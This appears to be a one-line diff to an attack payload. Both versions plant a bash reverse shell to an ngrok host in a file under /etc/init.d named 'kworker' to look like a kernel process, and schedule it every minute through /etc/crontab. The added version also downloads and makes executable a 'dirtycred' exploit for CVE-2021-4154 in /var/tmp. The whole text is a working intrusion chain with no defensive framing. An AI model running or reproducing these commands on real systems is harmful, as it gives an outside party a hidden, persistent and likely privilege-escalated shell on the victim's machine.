@@ -1,1 +1,1 @@
-echo '/bin/bash>/dev/tcp/7.tcp.eu.ngrok.io/15905 0>&1 2>&1 &' >> /etc/init.d/kworker ; chmod ugo+x /etc/init.d/kworker ; varuser=$(logname) ; echo "* * * * * $varuser bash /etc/init.d/kworker" >> /etc/crontab
+echo '/bin/bash>/dev/tcp/7.tcp.eu.ngrok.io/15905 0>&1 2>&1 &' >> /etc/init.d/kworker ; chmod ugo+x /etc/init.d/kworker ; varuser=$(logname) ; echo "* * * * * $varuser bash /etc/init.d/kworker" >> /etc/crontab ; cd /var/tmp ; curl https://github.com/yves-dj/payloadsForFun/raw/master/exploits/CVE-2021-4154/dirtycred -LJO ; chmod +x dirtycred
